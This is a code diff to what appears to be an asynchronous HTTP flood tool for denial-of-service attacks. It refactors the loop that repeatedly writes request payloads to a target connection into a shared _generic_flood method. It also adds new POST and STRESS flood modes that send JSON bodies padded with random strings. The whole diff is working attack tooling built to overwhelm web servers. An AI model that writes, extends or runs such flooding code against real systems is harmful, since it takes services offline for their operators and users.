@@ -921,18 +921,40 @@ class AsyncHttpFlood(HttpFlood):
         return reader, writer
 
     # XXX: config for timeouts
-    async def GET(self) -> int:
-        payload: bytes = self.generate_payload()
-        packets: int = 0
+    # XXX: with async generators the attack itself could be defined
+    #      independently from I/O operations
+    async def _generic_flood(self, payload: bytes) -> int:
+        packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
         for _ in range(self._rpc):
             writer.write(payload)
             await asyncio.wait_for(writer.drain(), timeout=1)
-            self._stats.track(1, len(payload))
-            packets += 1
+            self._stats.track(1, packet_size)
+            packets_sent += 1
         writer.close()
         await asyncio.wait_for(writer.wait_closed(), timeout=1)
-        return packets
+        return packets_sent
+
+    # XXX: again, with functions it's just a partial
+    async def GET(self) -> int:
+        payload: bytes = self.generate_payload()
+        return await self._generic_flood(payload)
+
+    async def POST(self) -> int:
+        payload: bytes = self.generate_payload(
+            ("Content-Length: 44\r\n"
+             "X-Requested-With: XMLHttpRequest\r\n"
+             "Content-Type: application/json\r\n\r\n"
+             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
+        return await self._generic_flood(payload)
+
+    async def STRESS(self) -> int:
+        payload: bytes = self.generate_payload(
+            (f"Content-Length: 524\r\n"
+             "X-Requested-With: XMLHttpRequest\r\n"
+             "Content-Type: application/json\r\n\r\n"
+             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
+        return await self._generic_flood(payload)
 
 
 def async_main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
